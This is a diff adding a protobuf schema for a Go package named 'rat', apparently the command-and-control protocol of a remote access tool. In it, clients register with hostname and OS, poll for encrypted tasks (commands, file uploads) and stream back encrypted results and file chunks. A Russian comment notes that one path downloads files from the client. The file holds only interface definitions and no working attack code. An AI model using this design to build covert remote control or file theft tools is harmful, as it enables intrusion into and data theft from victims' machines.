@@ -1,0 +1,59 @@
+syntax = "proto3";
+
+package proto;
+
+option go_package = "rat/internal/proto";
+
+
+service ClientService {
+    rpc Register (RegisterRequest) returns (RegisterResponce);
+    rpc GetTask (PollRequest) returns (TaskEnvelope);
+    rpc SendResult (stream ResultEnvelope) returns (Empty);
+}
+
+message RegisterRequest {
+    string client_id = 1;
+    string hostname = 2;
+    string os = 3;
+    bytes public_key = 4;
+}
+
+message RegisterResponce {
+    bytes public_key = 1;
+}
+
+message PollRequest {
+    string client_id = 1;
+}
+
+message TaskEnvelope {
+    bytes encrypted_data = 1;
+    bytes init_v = 2;
+}
+
+message ResultEnvelope {
+    string client_id = 1;
+    bytes encrypted_data = 2;
+    bytes init_v = 3;
+}
+
+message Empty {}
+
+message Task {
+    string task_id = 1;
+    string type = 2;
+    string command = 3;
+    string file_path = 4;
+    string file_data = 5;
+}
+
+message TaskResult {
+    string task_id = 1;
+    string output = 2;
+    string error = 3;
+
+    // если скачивание с клеинта
+    string file_name = 4;
+    bytes file_chunk = 5;
+    bool is_last = 6;
+}
